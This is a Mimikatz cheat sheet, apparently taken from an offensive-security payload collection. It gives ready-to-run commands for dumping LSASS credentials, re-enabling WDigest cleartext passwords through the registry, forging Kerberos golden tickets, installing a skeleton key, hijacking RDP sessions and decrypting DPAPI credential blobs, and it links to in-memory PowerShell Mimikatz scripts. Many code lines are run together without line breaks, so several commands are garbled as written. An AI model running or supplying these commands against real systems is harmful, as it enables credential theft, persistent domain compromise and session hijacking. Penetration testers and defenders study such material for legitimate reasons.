# Windows - Mimikatz

# Windows - Mimikatz

## Summary

- [Mimikatz - Execute commands](about:blank#)
- [Mimikatz - Extract passwords](about:blank#)
- [Mimikatz - Mini Dump](about:blank#)
- [Mimikatz - Golden ticket](about:blank#)
- [Mimikatz - Skeleton key](about:blank#)
- [Mimikatz - RDP session takeover](about:blank#)
- [Mimikatz - Credential Manager & DPAPI](about:blank#)
- [Mimikatz - Commands list](about:blank#)
- [Mimikatz - Powershell version](about:blank#)
- [References](about:blank#references)

![http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)

Data in memory

## Mimikatz - Execute commands

Only one command

    PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

Mimikatz console (multiple commands)

    PS C:\temp\mimikatz> .\mimikatzmimikatz # privilege::debugmimikatz # sekurlsa::logonpasswordsmimikatz # sekurlsa::wdigest

## Mimikatz - Extract passwords

> Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.

    mimikatz_command -f sekurlsa::logonPasswords fullmimikatz_command -f sekurlsa::wdigest# to re-enable wdigest in Windows Server 2012+# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest# create a DWORD 'UseLogonCredential' with the value 1.reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1

:warning: To take effect, conditions are required : - Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2: * Adding requires lock * Removing requires signout - Win10: * Adding requires signout * Removing requires signout - Win2016: * Adding requires lock * Removing requires reboot

## Mimikatz - Mini Dump

Dump the lsass process.

    C:\procdump.exe -accepteula -ma lsass.exe lsass.dmpnet use Z: https://live.sysinternals.comZ:\procdump.exe -accepteula -ma lsass.exe lsass.dmp

Then load it inside Mimikatz.

    mimikatz # sekurlsa::minidump lsass.dmpSwitch to minidumpmimikatz # sekurlsa::logonPasswords

## Mimikatz - Golden ticket

    .\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt

    .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit

## Mimikatz - Skeleton key

    privilege::debugmisc::skeleton# map the sharenet use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz# login as someonerdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab

## Mimikatz - RDP session takeover

Run tscon.exe as the SYSTEM user, you can connect to any session without a password.

    privilege::debugtoken::elevatets::remote /id:2

    # get the Session ID you want to hijackquery usercreate sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"net start sesshijack

## Mimikatz - Credential Manager & DPAPI

    # check the folder to find credentialsdir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*# check the file with mimikatz$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0# find master key$ mimikatz !sekurlsa::dpapi# use master key$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b

## Mimikatz - Commands list

[Untitled](Windows%20Mimikatz/Untitled%20Database.csv)

## Mimikatz - Powershell version

Mimikatz in memory (no binary on disk) with :

- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit

More informations can be grabbed from the Memory with :

- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)

## References

- [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
- [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
- [Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)